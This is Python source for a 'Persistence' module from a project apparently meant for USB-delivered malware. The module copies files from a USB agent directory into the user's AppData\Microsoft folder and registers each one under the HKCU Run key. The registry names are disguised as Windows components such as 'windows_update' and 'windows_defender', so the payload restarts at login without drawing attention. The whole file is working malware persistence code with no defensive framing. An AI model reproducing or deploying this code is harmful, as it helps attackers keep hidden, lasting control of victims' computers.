# -*- coding: utf-8 -*-

# https://github.com/Hnfull/Splendente-USB

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import subprocess
import shutil
import random

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

class Persistence:

    def __init__(self):
        self.targetDirPath          = os.environ["APPDATA"] + "\\Microsoft"
        self.targetRegisterPath     = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.targetRegisterVersion  = [
                                        " /v windows_update", 
                                        " /v windows_tasks", 
                                        " /v windows_system", 
                                        " /v windows_defender",
                                        " /v windows_scheduler",
                                        " /v windows_network",
                                        " /v windows_scanning"
        ] 
        self.targetRegisterType         = " /t REG_SZ"
        self.RegisterVersionALreadyUsed = []


    def Registry(self, agentUsbDirectory):
        if not os.listdir(agentUsbDirectory):
            return 1
        else:
            for files in os.listdir(agentUsbDirectory):
                if files != "yourFile.exe":
                    if os.path.isfile(self.targetDirPath + "\\" + files) == False:
                        shutil.copy(agentUsbDirectory + "\\" + files, self.targetDirPath)

                        if os.path.exists(self.targetDirPath + "\\" + files) == True:   
                            if os.path.getsize(self.targetDirPath + "\\" + files) > 0:
                                targetFile = " /d " + self.targetDirPath + "\\{}".format(files)
                                targetRegisterVersion = "{}".format(random.choice(self.targetRegisterVersion))

                                self.RegisterVersionALreadyUsed.append(targetRegisterVersion)

                                for version in self.RegisterVersionALreadyUsed:
                                    if version == targetRegisterVersion:
                                        while version == targetRegisterVersion:
                                            targetRegisterVersion = "{}".format(random.choice(self.targetRegisterVersion))
                                            if version != targetRegisterVersion:
                                                break

                                subprocess.run(self.targetRegisterPath + targetRegisterVersion + \
                                    self.targetRegisterType + targetFile, shell=True, timeout=3)
                            else:
                                return 1
                        else:
                            return 1               
            return 0
